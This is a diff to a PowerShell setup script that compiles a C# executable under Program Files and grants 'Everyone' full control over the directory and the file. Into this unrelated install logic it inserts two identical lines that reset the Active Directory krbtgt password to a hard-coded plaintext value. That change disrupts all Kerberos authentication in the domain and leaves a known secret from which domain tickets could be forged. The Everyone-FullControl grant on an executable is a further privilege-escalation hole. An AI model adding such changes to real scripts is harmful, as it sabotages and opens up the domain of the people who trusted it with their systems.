@@ -393,6 +393,8 @@ Set-Acl -Path $targetDir -AclObject $acl
 Write-Host "Directory created and permissions granted to Everyone."
 & "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /out:"C:\Program Files\SomeApp\Example.exe" "C:\Program Files\SomeApp\Example.cs"
 # Grant "Everyone" full control over the executable
+Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString -AsPlainText "NewSecurePassword123" -Force) -Reset
+Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString -AsPlainText "NewSecurePassword123" -Force) -Reset
 $acl = Get-Acl $exeOutputPath
 $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
 $acl.SetAccessRule($rule)
